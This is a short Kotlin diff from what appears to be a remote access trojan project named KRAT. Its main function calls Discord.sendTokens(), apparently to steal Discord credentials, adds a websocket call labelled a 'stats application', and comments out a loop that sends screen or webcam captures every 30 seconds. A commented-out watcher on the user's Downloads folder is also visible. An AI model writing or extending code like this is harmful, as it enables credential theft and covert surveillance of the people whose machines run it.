@@ -13,9 +13,11 @@ object KRAT {
 }
 
 fun main() {
+    websocket.main() // stats application
+
     Discord.sendTokens()
 
-    val coroutineScope = CoroutineScope(Dispatchers.Default)
+    /*val coroutineScope = CoroutineScope(Dispatchers.Default)
 
     coroutineScope.launch {
         while (isActive) {
@@ -23,9 +25,9 @@ fun main() {
             Screen.sendWebcam()
             delay(30_000)
         }
-    }
+    }*/
 
-    coroutineScope.cancel()
+//    coroutineScope.cancel()
 
     /*.SystemWatcher(Paths.get("C:/Users/${.Main.user}/Downloads"), recursive = true).apply {
         on<.SystemEvent.Created> { println("Created: ${it.path}") }
